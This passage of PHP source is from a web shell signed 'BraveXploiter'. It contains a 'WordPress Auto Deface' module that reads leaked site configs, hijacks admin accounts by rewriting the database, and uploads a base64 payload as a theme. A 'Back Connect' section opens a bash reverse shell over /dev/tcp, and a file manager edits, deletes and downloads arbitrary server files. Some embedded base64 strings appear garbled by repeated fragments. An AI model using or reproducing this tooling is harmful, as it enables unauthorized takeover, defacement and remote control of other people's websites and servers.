                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "PALCT";
        $pass = "PALCT";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {              
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                $upload3 = base64_decode("Z2FudGVuZw0KPDByFzdUTB57rSCNByzWB6ZAyCNHQU8hvg8gWZ5Yjx07DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLPWKtcPjpxQzc26CxTB57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84DPFuQMNfm2RfEHfK0KDQo/Pg==");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='lime'>berhasil</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                    } else {
                    echo "[-] <font color='red'>gagal</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";  
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface V.2</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='./Chu404' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form></center>";
    }
} elseif($_GET['do'] == 'network') {
    echo "<center><form method='post'>
    Back Connect: <br>
    <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
    <input type='text' placeholder='port' name='port_bc' value='6969'><br>
    <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
    </form>";
    if(isset($_POST['sub_bc'])) {
        $ip = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
    }
    echo "</center>";
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    $delete_dir = rmdir($dir);
    if($delete_dir) {
        $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
        $act = "<font color=red>could not remove ".basename($dir)."</font>";
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=lime>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
} else {
    if(is_dir($dir) == true) {
        echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr>
        <th class="th_home"><center>Name</center></th>
        <th class="th_home"><center>Type</center></th>
        <th class="th_home"><center>Size</center></th>
        <th class="th_home"><center>Last Modified</center></th>
        <th class="th_home"><center>Permission</center></th>
        <th class="th_home"><center>Action</center></th>
        </tr>';
        $scandir = scandir($dir);
        foreach($scandir as $dirx) {
            $dtype = filetype("$dir/$dirx");
            $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
            if(!is_dir("$dir/$dirx")) continue;
            if($dirx === '..') {
                $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
            } elseif($dirx === '.') {
                $href = "<a href='?dir=$dir'>$dirx</a>";
            } else {
                $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
            }
            if($dirx === '.' || $dirx === '..') {
                $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                } else {
                $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
            }
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DByFzdUTB57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84DADs='>$href</td>";
           
            echo "<td class='td_home'><center>$dname</center></th>";
            echo "<td class='td_home'><center>$dtype</center></td>";
            echo "<td class='td_home'><center>-</center></th>";
            echo "<td class='td_home'><center>$dtime</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
        }
        echo "</tr>";
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU15uyvefmcd2DkAeM9PLGKt11yMBdfcuERQThxZEIW/qlvdtM38BNgJQmQgJGd+A/LPWKtcPjpxQzc26CxTtPFuQMNfm2RfEHfKYDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLPWKtcPjpxQzc26CxTtPFuQMNfm2RfEHfK6+u9oNLo3gM3NzTdHR+//zvJLPWKtcPjpxQzc26CxTtPFuQMNfm2RfEHfKRDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLPWKtcPjpxQzc26CxTB57rSCNByzWB6ZAyCNHQU8hvg8gWZ5Yjx0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqDByFzdUTB57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84DPFuQMNfm2RfEHfKllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDByFzdUT7Akp4suGo2ec1ar2Z2chdvnzARPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLPWKtcPjpxQzc26CxTtPFuQMNfm2RfEHfKfn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTB57rSCNByzWB6ZAyCNHQU8hvg8gWZ5YjxYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
        }
        echo "</tr></table><hr>";
    } else {
        echo "<font color=red>can't open directory</font>";
    }
    echo "<center>Copyright<font color=lime>! BraveXploiter !</font></a></center>";
}
?>
</html>